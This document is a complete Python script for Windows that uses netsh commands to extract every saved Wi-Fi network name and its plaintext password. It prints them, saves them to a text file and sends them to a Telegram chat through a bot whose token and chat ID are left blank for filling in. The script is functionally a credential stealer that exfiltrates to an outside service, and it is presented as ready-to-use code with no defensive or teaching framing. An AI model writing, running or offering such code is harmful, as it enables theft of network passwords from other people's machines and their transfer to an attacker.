import subprocess
import re
import sys
import platform
from colorama import init, Fore, Style
import telebot
from typing import List, Dict
from datetime import datetime

# Telegram configuration
BOT_TOKEN = ""
CHAT_ID = ""
MAX_MESSAGE_LENGTH = 2000

class WiFiProfileRetriever:
    def __init__(self):
        init()  # Initialize colorama
        self.profiles: List[Dict[str, str]] = []
        self.bot = None
        if BOT_TOKEN and CHAT_ID:
            try:
                self.bot = telebot.TeleBot(BOT_TOKEN)
                self.bot.get_me()  # Validate token with a simple ping
            except telebot.apihelper.ApiTelegramException as e:
                print(f"{Fore.RED}Error initializing Telegram bot: {e}{Style.RESET_ALL}")
                self.bot = None

    def _is_windows(self) -> bool:
        if platform.system() != "Windows":
            print(f"{Fore.RED}Error: This program requires Windows{Style.RESET_ALL}")
            return False
        return True

    def _get_wifi_profiles(self) -> List[str]:
        try:
            output = subprocess.check_output(
                ["netsh", "wlan", "show", "profiles"],
                text=True,
                encoding="utf-8"
            )
            return re.findall(r"All User Profile\s*:\s*(.+)", output)
        except subprocess.CalledProcessError:
            return []

    def _get_profile_details(self, profile: str) -> Dict[str, str]:
        try:
            details = subprocess.check_output(
                ["netsh", "wlan", "show", "profile", f'name="{profile}"', "key=clear"],
                text=True,
                encoding="utf-8"
            )
            password_match = re.search(r"Key Content\s*:\s*(.+)", details)
            return {
                "SSID": profile.strip(),
                "Password": password_match.group(1).strip() if password_match else ""
            }
        except subprocess.CalledProcessError:
            return {"SSID": profile.strip(), "Password": ""}

    def _format_output(self, profiles: List[Dict[str, str]], use_color: bool = False) -> str:
        if not profiles:
            return f"{Fore.YELLOW}No Wi-Fi profiles found{Style.RESET_ALL}" if use_color else "No Wi-Fi profiles found"

        lines = ["Wi-Fi Profiles", "=" * 40]
        for profile in profiles:
            if use_color:
                lines.extend([
                    f"{Fore.MAGENTA}SSID: {profile['SSID']}{Style.RESET_ALL}",
                    f"{Fore.BLUE}Password: {profile['Password'] or 'None'}{Style.RESET_ALL}",
                    f"{Fore.YELLOW}{'-' * 40}{Style.RESET_ALL}"
                ])
            else:
                lines.extend([f"SSID: {profile['SSID']}", f"Password: {profile['Password'] or 'None'}", "-" * 40])
        return "\n".join(lines)

    def _save_to_file(self) -> None:
        if not self.profiles:
            return

        timestamp = datetime.now().strftime("%H%M")
        filename = f"wifi_profiles_{timestamp}.txt"
        try:
            with open(filename, "w", encoding="utf-8") as f:
                f.write(self._format_output(self.profiles, use_color=False))
            print(f"{Fore.GREEN}Data saved to {filename}{Style.RESET_ALL}")
        except IOError as e:
            print(f"{Fore.RED}Error saving to file: {e}{Style.RESET_ALL}")

    def _split_message(self, message: str) -> List[str]:
        if len(message) <= MAX_MESSAGE_LENGTH:
            return [message]
        return [message[i:i + MAX_MESSAGE_LENGTH] for i in range(0, len(message), MAX_MESSAGE_LENGTH)]

    def _send_to_telegram(self) -> None:
        if not self.bot or not self.profiles:
            return

        message = self._format_output(self.profiles, use_color=False)
        messages = self._split_message(message)

        try:
            for i, msg in enumerate(messages, 1):
                self.bot.send_message(
                    CHAT_ID,
                    f"{msg}\n\nPart {i}/{len(messages)}" if len(messages) > 1 else msg
                )
            print("Done!")
        except telebot.apihelper.ApiTelegramException:
            print("!Done")

    def run(self) -> None:
        if not self._is_windows():
            sys.exit(1)

        print(f"{Fore.CYAN}Retrieving Wi-Fi profiles...{Style.RESET_ALL}")
        profiles = self._get_wifi_profiles()

        if not profiles:
            print(f"{Fore.RED}No Wi-Fi profiles could be retrieved{Style.RESET_ALL}")
            return

        self.profiles = [self._get_profile_details(profile) for profile in profiles]
        print(self._format_output(self.profiles, use_color=True))
        self._save_to_file()
        self._send_to_telegram()

if __name__ == "__main__":
    try:
        retriever = WiFiProfileRetriever()
        retriever.run()
    except Exception as e:
        print(f"{Fore.RED}An unexpected error occurred: {e}{Style.RESET_ALL}")
    finally:
        input("Press Enter to exit...")